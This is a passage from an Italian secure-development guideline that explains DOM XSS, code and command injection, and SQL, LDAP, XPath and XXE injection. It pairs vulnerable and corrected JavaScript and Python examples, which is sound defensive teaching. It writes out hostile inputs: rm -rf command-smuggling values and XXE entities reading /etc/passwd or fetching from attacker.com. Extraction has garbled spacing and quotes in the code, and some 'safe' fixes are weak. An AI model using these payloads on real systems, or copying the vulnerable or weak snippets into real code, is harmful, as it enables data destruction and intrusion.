uno script, un foglio di stile, un'immagine o altri  tipi di file trattati nella pagina. Ciò significa che 
anche se un utente malintenzionato riesce a inietta re contenuti dannosi nel sito Web, CSP può 
impedirne l'esecuzione. 
• Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura, tramite script, dei 
cookie di sessione. 
 
7.4.2  Client DOM Code Injection 
Come riconoscerla 
Un attaccante può eseguire codice arbitrario sulla macchina dell’application server. A seconda dei per messi 
di cui dispone l’applicazione, potrebbe: accedere a l database, leggere o modificare dati sensibili; le ggere, 
creare, modificare o cancellare file; aprire una co nnessione al server dell’attaccante; modificare il 
contenuto delle pagine; decifrare dati utilizzando le chiavi dell’applicazione; arrestare o avviare i servizi del 
sistema operativo; organizzare un reindirizzamento verso siti fake (fasulli) per operazioni di phishin g; 
prendere il completo controllo del server. 
Accade perché l'applicazione esegue alcune azioni e seguendo codice incluso nei dati in input non 
opportunamente validati e verificati. In questo cas o, il codice non attendibile viene letto dal browse r ed 
eseguito sul lato client. 
 
Come difendersi 
• Come prima cosa, l'applicazione non dovrebbe esegui re alcun codice non attendibile da qualsiasi 
fonte esterna possa provenire, inclusi l’input dell 'utente, dei file caricati (upload) o un database. 
 
 
Linee guida per lo sviluppo sicuro Pag. 85  a 156  
 
• Se è assolutamente necessario includere dati estern i nell'esecuzione dinamica, è consentito passare 
i dati come parametri al codice, ma non eseguire di rettamente i dati utente. 
• Se è necessario passare dati non attendibili all'es ecuzione dinamica, applicare una convalida dei 
dati molto rigorosa. Come al solito, occorre conval idare tutti gli input, indipendentemente dalla 
fonte. I parametri devono essere limitati a un set di caratteri consentito e l'input non convalidato 
deve essere eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, 
l’intervallo di validità, il formato e l’eventuale corrispondenza all’interno dei valori previsti (whi te 
list). Sconsigliata invece la black list, ossia un elenco di valori non consentiti: l’elenco sarebbe 
sempre troppo limitato, rispetto ai casi che potreb bero verificarsi. 
• L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
 
Esempio: 
codice vulnerabile: 
 eval (location.hash); 
La funzione eval esegue dinamicamente del codice. V a evitata. 
Il seguente codice è invece ragionevolmente sicuro,  poiché manda in esecuzione una funzione staticamen te 
codificata: 
 window.setTimeout(funzioneCodificata(), 1000); 
 
Per maggiori informazioni vedere http://cwe.mitre.org/data/definitions/94.html  
7.4.3  Client DOM Stored Code Injection 
Come riconoscerla 
Un malintenzionato potrebbe causare l'esecuzione di  contenuti ingegnerizzati nel browser, riscrivendo le 
pagine Web e inserendo script dannosi. L’utente leg ittimo sarebbe quindi indotto a fidarsi di ciò che gli 
viene proposto. Ciò permetterebbe all’attaccante di  rubare la password dell'utente, richiedere informa zioni 
sulla sua carta di credito, fornire informazioni fa lse o eseguire malware. La vittima continuerebbe la  sua 
attività ignara del pericolo, salvo poi accusare i responsabili del sito per i danni subiti. 
La pagina web dell'applicazione esegue alcune azion i eseguendo codice sul lato client, concatenando da ti di 
input da una cache sul lato client, come un cookie,  la LocalStorage dell’HTML5 o un database locale. C odice 
dannoso eventualmente presente nei dati potrebbe av viare attività progettate da un attaccante. 
 
Come difendersi 
Occorre evitare qualsiasi esecuzione dinamica del c odice. Se è proprio necessaria, anziché utilizzare i dati 
sul lato client, inclusi i dati precedentemente mem orizzati nella cache dalla stessa applicazione, uti lizzare 
solo dati attendibili provenienti dal server.    
 
 
Per maggiori informazioni vedere: http://cwe.mitre.org/data/definitions/94.html  
 
7.4.4  Client DOM Stored XSS 
Come riconoscerla 
Un malintenzionato può utilizzare l'accesso legitti mo all'applicazione per inviare dati ingegnerizzati  al 
database dell'applicazione. Quando un altro utente accede in seguito, le pagine Web potrebbero essere 
riscritte con i dati salvati e potrebbero essere at tivati script dannosi.       
L'applicazione crea pagine web che includono dati p rovenienti dal database, incorporati direttamente 
nell'HTML della pagina. Il browser, quindi, li visu alizza come parte della pagina.  
Il problema nasce quando questi dati salvati sono s tati immessi da un altro utente. Se i dati includon o 
frammenti HTML o Javascript malevoli, anche questi vengono visualizzati (o eseguiti), sebbene la vitti ma 
non si accorga dell’inganno sottostante. La vulnera bilità è perciò il risultato dell'incorporazione di  dati 
 
 
Linee guida per lo sviluppo sicuro Pag. 86  a 156  
 
arbitrari provenienti dal database, senza prima cod ificarli. La codifica trasforma i caratteri malevol i in 
normale testo, e il browser non può più trattarli c ome codice valido HTML/Javascript. 
 
Come difendersi 
• I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve 
essere eliminato. Oltre ai caratteri, occorre contr ollare il tipo di dati, la loro dimensione, l’inter vallo 
di validità, il formato e l’eventuale corrispondenz a all’interno dei valori previsti (white list). 
Sconsigliata invece la black list, ossia una lista di valori non consentiti: l’elenco sarebbe sempre 
troppo limitato, rispetto ai casi che potrebbero ve rificarsi. 
• La convalida non sostituisce la codifica (encoding) , ossia la neutralizzazione di tutti i caratteri 
potenzialmente eseguibili. Tutti i dati dinamici, i ndipendentemente dall'origine, devono essere 
codificati prima di incorporarli nell'output. La co difica dovrebbe essere sensibile al contesto, in ba se 
al tipo di dato che si vuole neutralizzare: se ci s i aspetta che possa esserci codice HTML abusivo, 
occorre codificare gli eventuali tag HTML, se ci si  potrebbe trovare di fronte a uno script, allora 
bisogna codificare per Javascript, ecc. 
• L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
• Nell'intestazione della risposta HTTP Content-Type,  definire esplicitamente la codifica dei caratteri 
(set di caratteri) per l'intera pagina. 
• Impostare il flag httpOnly sul cookie di sessione, per impedire agli exploit XSS di rubarlo. 
 
Esempio : 
La funzione Javascript che segue utilizza dati del database, senza verificarli, per creare dinamicamen te uno 
script: 
 
function renderUserProfileTable(res, connection, us er_id) { 
 connection.query('SELECT id,name,description from user WHERE id= ?', 
[user_id],function(err, results) { 
  var table = "<table>" 
  table += "<table class='profile-html-tablè>" 
  table += "<tr><td>" + results[0].name + "</td></t r>" 
  table += "<tr><td>" + results[0].description + "< /td></tr>" 
  table += "</table>" 
  res.render("profile", table) 
 }); 
} 
Qui di seguito la funzione viene bonificata tramite  l’encoding dei valori letti dal database, effettua to prima 
di incorporarli nella pagina web: 
 
var htmlencoder = require('htmlencodè); 
 
function renderUserProfileTable(res, connection, us er_id) { 
connection.query('SELECT id,name,description from u ser WHERE id= ?',  
[user_id],function(err, results) { 
  var table = "<table>" 
  table += "<table class='profile-html-tablè>" 
  table += "<tr><td>" + htmlencoder.htmlEncode(resu lts[0].name) + 
"</td></tr>" 
  table += "<tr><td>" + htmlencoder.htmlEncode(resu lts[0].description) + 
"</td></tr>" 
  table += "</table>" 
  res.render("profile", table) 
 }); 
} 
 
Per maggiori informazioni vedere: http://cwe.mitre.org/data/definitions/79.html  
 
 
Linee guida per lo sviluppo sicuro Pag. 87  a 156  
 
7.4.5  Client DOM XSS 
Come riconoscerla 
Un utente malintenzionato può utilizzare il social engineering per indurre un utente a inviare l'input  
modificato in modo malevolo verso il sito Web, ad e sempio inducendolo a cliccare su un URL con un’anco ra 
(hash) modificata, facendo sì che il browser riscri va le pagine Web. L'aggressore può quindi dirottare  la 
vittima verso un server fake (fasullo), che gli con sentirebbe di rubare la password dell'utente, farsi  inserire i 
dati della carta di credito, fornire informazioni f alse o eseguire del malware. Ovviamente la vittima rimane 
ignara di ciò che accade. 
L’attacco è possibile perché la pagina Web dell'app licazione incorpora nella pagina dati provenienti 
dall'input dell'utente (incluso l'URL della pagina) , facendo sì che il browser li visualizzi come part e della 
pagina Web. Se l'input include frammenti HTML o Jav aScript, anche questi vengono visualizzati (ed 
eseguiti). La vulnerabilità è il risultato dell'inc orporamento di input dell'utente arbitrario senza p rima 
codificarlo in un formato che impedirebbe al browse r di trattarlo come HTML anziché come testo normale . 
 
Come difendersi 
• I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve 
essere eliminato. Oltre ai caratteri, occorre contr ollare il tipo di dati, la loro dimensione, l’inter vallo 
di validità, il formato e l’eventuale corrispondenz a all’interno dei valori previsti (white list). 
Sconsigliata invece la black list, ossia un elenco di valori non consentiti: l’elenco sarebbe sempre 
troppo limitato, rispetto ai casi che potrebbero ve rificarsi. 
• Effettuare un encoding (codifica) su tutti i dati d inamici prima di includerli nella pagina web. 
Considerare per tale scopo la libreria ESAPI4JS di OWASP. 
 
Esempio: 
codice vulnerabile: 
 document.write("Il sito si trova qui: " + document .location); 
codice sicuro: 
 document.write("Il sito si trova qui: " +  
  ESAPI4JS.encodeForURL( document.location) ); 
 
Per maggiori informazioni vedere: http://cwe.mitre. org/data/definitions/79.html 
 
7.5  Python 
Python è un linguaggio di programmazione ad alto li vello, orientato agli oggetti, adatto, tra l’altro,  per 
sviluppare applicazioni distribuite, scripting, app licazioni web, applicazioni di computazione numeric a e di 
system testing. 
Fu sviluppato da Guido van Rossum nel peridodo 1985 -1990 come Open Source, sotto licenza GNU General 
Public License (GPL). 
Dato il grande successo e la diffusione del linguag gio, sono sosrti numerosi framework e librerie che ne 
aumentanto le potenzialità, sia in termini di carat teristiche, che di prestazioni. 
Di seguito, un elenco delle principali vulnerabilit à alle quali i programmi Python possono essere sogg etti e 
le contromisure da adottare per mitigarle. 
7.5.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità di inoculare uno script e di mandarlo in esecuzione  sul front-
end dell’applicazione. Tramite tecniche sviluppate da malintenzionati per ottenere informazioni person ali, 
possono, ad esempio, essere simulate pagine quasi i dentiche ad altri siti molto frequentati per ottene re 
informazioni riservate. La prassi del “social engin eering” consente di ingannare gli utenti per indurl i a 
visitare pagine fraudolente. Gli attacchi XSS di ti po reflected si verificano ogni qualvolta uno scrip t viene 
 
 
Linee guida per lo sviluppo sicuro Pag. 88  a 156  
 
inoculato ed eseguito nel periodo in cui dura la se ssione. Gli XSS stored, viceversa, sono script male voli che 
sono stati memorizzati su una base dati e vengono p ertanto incorporati nella pagina ( e quindi eseguit i) 
ogni volta che qualcuno ne fa richiesta. 
Siamo di fronte ad DOM based XSS se i dati malevoli , contenenti tag HTML e script, vengono incorporati  
direttamente nell'HTML della pagina, in modo che il  browser visualizzerà queste informazioni come part e 
della pagina web eseguendo in maniera silente gli s cript. Chi visualizza la pagina modificata in modo 
fraudolento non sarà in grado di riconoscere l’inga nno. 
 
Come difendersi 
• Per prima cosa è necessatio convalidare tutti gli i nput, indipendentemente dalla fonte: la 
convalidazione dovrebbe essere basata su una white list (una lista di valori ammessi), per cui 
verrebbero accettati solo i dati compresi e rifiuta ti tutti gli altri. 
• Oltre a controllare che i valori siano compresi fra  quelli ammessi o che rientrino in un determinato 
intervallo di validità, occorre verificare che corr ispondano alle attese anche il tipo, la dimensione e 
il formato dei dati in input. 
• Un altro accorgimento consiste nell’encoding di tut ti i dati dinamici, cioè nella neutralizzazione dei  
caratteri pericolosi, in modo da rendere inattivi e ventuali inserimenti malevoli. La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• È opportuno attivare lo standard Content Security P olicy (CSP) in modo che solo le risorse scaricate 
da fonti attendibili possano essere utilizzate. Imp ostare l’attributo HTTPOnly a true per impedire il 
furto dei cookie. 
• La maggior parte dei template di Python oggi fanno l’escaping dell’input, anche se questa funzione 
può essere disattivata. Il modulo flask fa l‘escapi ng dell’HTML. 
 
Esempio: 
Codice non corretto: 
@app.route("/") 
def hello(): 
  name = request.args.get('namè) 
  return "Hello %s" % name 
Codice corretto: 
from flask import escape 
@app.route("/") 
def hello(): 
  name = request.args.get('namè) 
  return "Hello %s" % escape(name) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html, 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.5.2  Code Injection 
Come riconoscerla 
Le vulnerabilità legate all'iniezione di codice sul  lato server sorgono quando un'applicazione incorpo ra dati 
controllabili da parte dell'utente in una stringa c he viene valutata dinamicamente da un interprete di  
codice. Se i dati dell'utente non sono rigorosament e convalidati, un malintenzionato può utilizzare l’ input 
per iniettare codice arbitrario che verrà eseguito dal server. 
Le vulnerabilità legate all'iniezione di codice sul  lato server sono in genere molto gravi e portano a  una 
completa compromissione dei dati, delle funzionalit à dell'applicazione e spesso persino del server che  
 
 
Linee guida per lo sviluppo sicuro Pag. 89  a 156  
 
ospita l'applicazione. In tal caso l’attaccante pot rebbe anche utilizzare il server come piattaforma p er 
ulteriori attacchi contro altri sistemi. 
Il pericolo si manifesta quando un malintenzionato riesce ad eseguire codice arbitrario nell'host 
dell’application server. Si potrebbero avere le seg uenti problematiche: 
• Possibilità di modificare i permessi all’interno di  file o directory nel file system(read / create / 
modify / delete); 
• Modifiche della struttura del sito web; 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante; 
• Permettere ad utenti malintenzionati la gestione de i servizi con possibili start and stop dei servizi di 
sistema; 
• Acquisizione completa del server da parte dell'atta ccante. 
 
Come difendersi 
Ove possibile, le applicazioni dovrebbero evitare d i incorporare dati controllabili dall'utente per ac quisire 
codice che verrà eseguito dinamicamente. In quasi o gni situazione esistono metodi alternativi più sicu ri per 
l'implementazione di funzioni applicative che non s iano manipolabili per iniettare codice arbitrario. 
Se si ritiene inevitabile integrare i dati forniti dall'utente nel codice eseguito dinamicamente, i da ti devono 
essere validati rigorosamente. Idealmente, dovrebbe  essere utilizzata una white list di specifici valo ri 
accettati. Altrimenti, dovrebbero essere accettate solo stringhe alfanumeriche brevi. Gli input conten enti 
altri dati, inclusi eventuali metacaratteri di codi ce eseguibile, devono essere respinti.  
L’uso di exec() ed eval() va evitato per la possibi lità di incorrere in una code injection. 
 
Esempio: 
Il seguente esempio mostra due funzioni che imposta no un nome a paritre da una request. La prima 
funzione utilizza exec per eseguire la funzione set name. Ciò è pericoloso in quanto un malintenzionato  
potrebbe approfittarne per eseguire codice arbitrar io sul server.  
Ad esempio, potrebbe fornire il valore "'+ subproce ss.call (' rm -rf ') +'", che distruggerebbe il fil e system del 
server.  
La seconda funzione chiama direttamente la funzione  setname e il parametro fornito dall'utente viene 
utilizzato come dato. Nessun codice potrebbe qui es sere eseguito. 
 
def esecuzione_codice_non_sicura(request): 
  if request.method == 'POST': 
    nome = base64.decodestring(request.POST.get('no mè, '')) 
    #NON SICURO – Permette all’utente di eseguire d el codice arbitrario. 
    exec("setname('%s')" % nome) 
 
def esecuzione_codice_sicura(request): 
  if request.method == 'POST': 
    nome = base64.decodestring(request.POST.get('no mè, '')) 
    #SICURO – Il parametro utente solo un valore ch e non verrà eseguito. 
    setname(nome) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, 
Improper Control of Generation of Code ('Code Injec tion') CWE-94 
7.5.3  Command Injection 
Come riconoscerla 
Si è in presenza di un attacco di command injection , noto anche come OS injection, quando l’input uten te 
non verificato viene utilizzato, in tutto o in part e, come argomento di funzioni che eseguono comandi di 
shell. Tramite questa vulnerabilità un aggressore p otrebbe eseguire comandi di sistema operativo arbit rari 
sull'host dell’application server. In base alle aut orizzazioni dell'applicazione, potrebbe: 
 
 
Linee guida per lo sviluppo sicuro Pag. 90  a 156  
 
• Alterare i permessi di file e directory all’interno  del file system (read / create / modify / delete) 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante 
• Acquisire il controllo dei servizi di sistema, arre standoli o avviandoli. 
• Prendere il pieno controllo del server. 
Come difendersi 
Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di basso livello, devono essere preferit e specifiche API fornite dalle aziende produttrici di 
software. 
Se è non è possibile rimuovere l'esecuzione del com ando, eseguire solo stringhe statiche che non inclu dono 
l'input dell'utente. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere basat a su 
una white list: dovrebbero essere accettati solo i dati conformi a una struttura specificata, e scarta ti i dati 
che non rientrano in questa categoria. I parametri devono essere limitati a un set di caratteri consen tito e i 
valori non validi devono essere eliminati. Oltre ai  caratteri, occorre verificare il tipo del dato, la  sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). Conf igurare 
l'applicazione da eseguire utilizzando un account u tente limitato che non disponga di privilegi non 
necessari. 
Se possibile, isolare tutta l'esecuzione dinamica u tilizzando un account utente separato e dedicato, c he 
abbia privilegi solo per le operazioni e i file spe cifici utilizzati dall'applicazione, in base al pri ncipio 
denominato "Principle of Least Privilege". Il princ ipio stabilisce che agli utenti venga attribuito il  più basso 
livello di “diritti” che possano detenere rimanendo  comunque in grado di compiere il proprio lavoro. 
 
Esempio: 
Nel seguente codice viene utilizzato un input non v erificato per lanciare una shell dei comandi: 
import subprocess 
 
def codifica_file(): 
  nome_file = raw_input('Inserire nome file da codi ficare: ') 
  comando = 'ffmpeg -i "{source}" file_di_output.mp g'.format(source=nome_file) 
  subprocess.call(comando, shell=True) # DA NON FAR E 
 
Se viene fornito un nome file concatenato con la st ringa “; rm -rf /”, il comando di cancellazione del l’intero 
file system verrebbe eseguito automaticamente. 
Il paramentro shell deve essere sempre “false” per impedire l’esecuzione di comandi multipli, ma ciò n on è 
sufficiente se la stringa passata, incece di conete nere un nome file, contiene un comando malevolo. 
Sarebbe meglio non usare affatto la subprocess.call (), ma se proprio dev’essere fatta, il parametro pa ssato 
a questa funzione dovrebbe essere sottoposto a esca ping con la funzione shlex.quote(). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html , 
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.5.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o  a un server LDAP. Un malintenzionato potrebbe inse rire 
una stringa opportunamente artefatta ed eseguire un a delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
 
 
Linee guida per lo sviluppo sicuro Pag. 91  a 156  
 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente per l'autenticazione stessa. Se i valori immessi sono s tati 
verificati in misura insufficiente o non sono stati  affatto verificati, la stringa di connessione potr ebbe essere 
manipolata ad arte a vantaggio dell’attaccante. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). In generale, è necessario c ontrollare il tipo del dato, la sua dimensione, l'i ntervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente una 
stringa di connessione evitare di includere l'input  dell'utente. In ogni caso, utilizzare utilità basa te sulla 
piattaforma per validarlo. 
 
Esempio: 
Forma non corretta: L'applicazione crea una stringa  di connessione usando l'input dell'utente: 
from  sys import  stdin 
import  cx_Oracle 
print  'Insert your ID: '  
userInput = stdin.readline() 
connection = cx_Oracle.connect(userInput + '/password@99.999.9.99:PORT/SID' ) 
 
L’input deve essere validato prima di utilizzarlo a ll’interno della costruzione di una stringa di conn essione. 
Se si riesce a fare a meno dell’input utente per qu esto scopo è ancora meglio. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html , 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.5.5  LDAP Injection 
Come riconoscerla 
Si verifica quando l’applicazione comopne dinamicam ente query LDAP utilizzando l’input utente, senza 
preventivamente verificarlo e validarlo. 
Un attacco del genere permette: 
• il login con un’utenza diversa (spoofing); 
• l’acquisizione di privilegi di sistema (escalation of privileges); 
• Il furto di  informazioni. 
Per comunicare con il proprio servizio di directory  (ad esempio Active Directory), l'applicazione cost ruisce 
dinamicamente una stringa di connessione, includend o valori inseriti dall'utente in fase di autenticaz ione. 
Se i valori immessi dall'utente non sono stati veri ficati, né tantomeno sanificati, l'input potrebbe e ssere 
utilizzato per manipolare ad arte la stringa di con nessione. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla p rovenienza. Per la validazione, si consiglia l’appr occio 
white list (sono accettati solo i dati specificati nella white list, scartando quelli che non la rispe ttano). 
Occorre controllare il tipo del dato, la sua dimens ione, l'intervallo di validità (range), il formato ed eventuali 
valori attesi (white list). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html , 
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 92  a 156  
 
7.5.6  Resource Injection 
Come riconoscerla  
Un utente malintenzionato potrebbe aprire una backd oor per connettersi direttamente al server, aggiran do 
tutti le procedure di autenticazione e autorizzazio ne. 
Come difendersi 
Non consentire a un utente di definire i parametri relativi ai sockets di rete.  
Esempio: 
Forma non corretta – L'applicazione apre una socket  di rete utilizzando un nome host immesso dall'uten te: 
from  sys import  stdin 
import  socket 
import sys 
userInput = stdin.readline() 
HOST = userInput  
PORT = 8888  # Arbitrary non-privileged port  
   
s = socket.socket(socket.AF_INET, socket.SOCK_STREA M) 
print  'Socket created'  
 #Bind socket to local host and port  
try: 
  s.bind((HOST, PORT)) 
except  socket.error as  msg: 
  print  'Bind failed. Error Code : '  + str(msg[ 0]) + ' Message '  + msg[ 1] 
  sys.exit() 
print  'Socket bind completè  
 
Forma corretta - L'applicazione indica uno o piu' i ndirizzi host codificati in una white-list tra i qu ali l'utente 
può scegliere.  
import  socket 
import sys 
HOST = ''   # Symbolic name, meaning all available interfaces  
PORT = 8888  # Arbitrary non-privileged port  
s = socket.socket(socket.AF_INET, socket.SOCK_STREA M) 
print  'Socket created'  
#Bind socket to local host and port  
try: 
  s.bind((HOST, PORT)) 
except  socket.error as  msg: 
  print  'Bind failed. Error Code : '  + str(msg[ 0]) + ' Message '  + msg[ 1] 
  sys.exit() 
print  'Socket bind completè  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.5.7  SQL Injection 
Come riconoscerla  
Se l’applicazione compone le query SQL per interrog are il database con l’input dell’utente, un 
malintenzionato potrebbe introdurre satringhe alter ate ad arte per accedere indebitamente ai dati del 
sistema, rubare qualsiasi informazione riservata me morizzata (ad esempio i dati personali dell'utente o le 
carte di credito) ed eventualmente modificare o can cellare i dati esistenti. 
L'applicazione comunica con il suo database inviand o una query SQL in formato testo. Se l'applicazione  crea 
la query semplicemente concatenando le stringhe pro venienti dall'input dell'utente, non verificandone la 
validità, il pericolo che venga sferrato un attacco  di SQL injection è molto concreto. 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 93  a 156  
 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list: dovrebbero essere accettati cioè  solo i dati conformi a una struttura specificata, 
scartando quelli che non la rispettano. Occorre con trollare il tipo del dato, la sua dimensione, l'int ervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Invece di concatenare le stringhe si consiglia di:  
• Utilizzare componenti di database sicuri come le st ored procedures, le query parametrizzate e le 
associazioni degli oggetti (per comandi e parametri ); 
• Una soluzione consigliabile è l’adozione di una lib reria ORM, come EntityFramework, Hibernate o 
iBatis. 
• Occorre inoltre limitare l'accesso agli oggetti e a lle funzionalità di database, in base al "Principle  of 
Least Privilege" (non fornire agli utenti permessi più elevati di quelli strettamente necessari). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html , 
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
 
Esempio: 
Il codice seguente adotta una query parametrizzata,  una difesa contro la SQL injection: 
cursor = connection.cursor(prepared=True) 
stringaSQLInserimento = """ INSERT INTO dipendenti 
          (id, Nome, DataAssunzione, Importo_Annuo)  VALUES (%s,%s,%s,%s)""" 
 
tupla_inserimento_1 = (progressivo, input_name, dat etime.datetime.now(), 
input_salario) 
cursor.execute(stringaSQLInserimento, tupla_inserim ento_1) 
 
connection.commit() 
print("record inserito")  
  
7.5.8  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. Possibil mente 
mapparla con i parametri utente mantenendo la separ azione tra dati e codice. Nel caso fosse necessario  
includere l'input dell’utente nella query, questo d ovrà essere precedentemente validato. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list (si dovrebbero accettare solo i d ati che adattano a una struttura specificata, scart ando 
quelli che non la rispettano). Bisogna controllare il tipo del dato, la sua dimensione, l'intervallo d i validità 
(range), il formato ed eventuali valori attesi (whi te list). 
 
Esempio: 
Forma non corretta: l'applicazione utilizza una str inga inserita dall'utente per costruire una query X Path:  
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + userInput, doc) 
 
 
Linee guida per lo sviluppo sicuro Pag. 94  a 156  
 
 
Forma corretta: la stringa inserita dall'utente vie ne trasformata con un’opportuna routine di escaping , 
prima dell'uso nella query XPath:  
from  sys import  stdin 
import  XPath 
print  'Insert item number: '  
userInput = stdin.readline()  
XPath.find( '//item'  + escaped(userInput), doc) 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html , 
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.5.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
• Le librerie utilizzate da Python per fare il parsin g sono: sax, etree, minidom, pulldom, xmlrpc. 
Nessuna di loro offre una protezione completa da at tacchi di tipo XXE, per cui è necessario – se si 
ha necessità di importare entità esterne, di valida te il contenuto in entrata prima di sottoporlo a 
parsing. 
 
7.5.10  OS Access Violation 
Come riconoscerla  
Un malintenzionato potrebbe preparare un input che potrebbe causare una violazione di accesso, perdita  
di dati privati, danneggiamento di dati o un arrest o di eventuali servizi con possibile arresto 
dell'applicazione stessa. 
Il modulo OS di Python fornisce un'interfaccia dest inata all'utilizzo delle funzionalità del sistema o perativo 
che consente l'accesso al file system e alla sua ma nipolazione arbitraria. Nel caso in cui un aggresso re fosse 
in grado di fornire un input specifico per il modul o OS, potrebbero verificarsi situazioni di violazio ne di 
accesso o di corruzione dei dati, laddove non fosse ro messi in atto i dovuti controlli. 
Come difendersi 
 
 
Linee guida per lo sviluppo sicuro Pag. 95  a 156  
 
• Trust boundaries. Non utilizzare il modulo OS per l a manipolazione di file host ricevuti da una fonte 
non attendibile o controllata dall'utente.  
• Comunicazione protetta. Assicurarsi che venga utili zzata una connessione di rete crittografata. 
• Validazione. Il path di un file che si vuole manipo lare dev’essere validato in modo corretto: evitare 
che possa essere inserito da un utente in modo dina mico. Assicurarsi, inoltre, che rispecchi 
completamente delle regole canoniche. 
• Sandbox. Limitare l'accesso al percorso dei file al l'interno di una directory specifica. 
• White list. Creare una white list di file o directo ry che possono essere manipolati in modo sicuro e 
consentire l'accesso solo a questi file o directory . 
 
Esempio:  
Forma non corretta: l'applicazione riceve un file p ath dall'utente e rimuove il file stesso: 
import os 
import sys 
[…] 
path = sys.stdin.readline()[:- 1] 
os.remove(path) 
Forma corretta: l'applicazione restringe l'accesso ad un file ad una specifica directory: 
import os 
import sys 
def  is_safe_path (basedir, path): 
return  os.path.abspath(path).startswith(basedir) 
path = sys.stdin.readline()[:- 1] 
if  not  is_safe_path( '/tmp/userfiles' , path): 
sys.stdout.write( 'Not allowed!\n' ) 
sys.exit() 
os.remove(path) 
7.5.11  Unsecure deserialization 
Come riconoscerla 
